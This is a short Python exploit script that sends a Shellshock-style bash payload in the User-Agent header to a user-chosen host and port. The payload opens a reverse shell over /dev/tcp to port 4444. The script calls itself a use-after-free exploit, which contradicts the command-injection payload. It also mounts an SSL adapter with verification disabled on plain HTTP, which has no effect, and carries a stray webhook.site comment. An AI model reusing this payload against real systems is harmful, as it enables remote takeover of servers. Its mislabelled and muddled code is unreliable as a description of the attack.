#!/usr/bin/python3
import argparse
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.poolmanager import PoolManager
from requests.packages.urllib3.util.ssl_ import create_urllib3_context

#COMPRAR https://webhook.site/login

class SSLAdapter(HTTPAdapter):
    def __init__(self, *args, **kwargs):
        super(SSLAdapter, self).__init__(*args, **kwargs)
        self.ssl_context = create_urllib3_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = 0  # SSL verification off

    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_context'] = self.ssl_context
        return super(SSLAdapter, self).init_poolmanager(*args, **kwargs)

def send_request(ip, port):
    url = f"http://{ip}:{port}/"
    
    headers = {
        'Host': ip,
        'User-Agent': '() { :; }; /bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'  # Example payload
    }
    
    session = requests.Session()
    session.mount('http://', SSLAdapter())
    
    try:
        response = session.get(url, headers=headers)
        print("Response Code:", response.status_code)
        print("Response Content:", response.text)
    except requests.RequestException as e:
        print("Error:", e)

def main():
    parser = argparse.ArgumentParser(description='Exploit use-after-free vulnerability by sending crafted HTTP headers.')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target port')
    
    args = parser.parse_args()
    
    if args.ip and args.port:
        send_request(args.ip, args.port)

if __name__ == '__main__':
    main()
